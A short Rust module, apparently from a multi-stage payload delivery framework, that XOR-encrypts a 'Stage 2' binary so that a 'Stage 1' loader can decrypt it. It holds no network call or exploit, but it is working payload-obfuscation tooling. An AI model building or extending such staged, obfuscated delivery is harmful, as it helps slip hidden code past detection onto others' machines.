//! Stage 2 Builder
//!
//! Encrypts Stage 2 binary for delivery via Stage 1.
//! Uses XOR encryption to match Stage 1's decryption capability.

use anyhow::{Context, Result};
use std::fs;
use std::path::Path;
use crate::crypto::xor_encrypt;

/// Build encrypted Stage 2 payload.
///
/// Stage 1 uses XOR decryption, so we XOR encrypt here.
pub fn build_stage2(
    stage2_path: &Path,
    output_path: &Path,
    xor_key: &[u8],
) -> Result<()> {
    // Read Stage 2 binary
    let stage2 = fs::read(stage2_path)
        .with_context(|| format!("Failed to read Stage 2: {}", stage2_path.display()))?;

    // XOR encrypt
    let encrypted = xor_encrypt(&stage2, xor_key);

    // Write output
    fs::write(output_path, &encrypted)
        .with_context(|| format!("Failed to write output: {}", output_path.display()))?;

    Ok(())
}
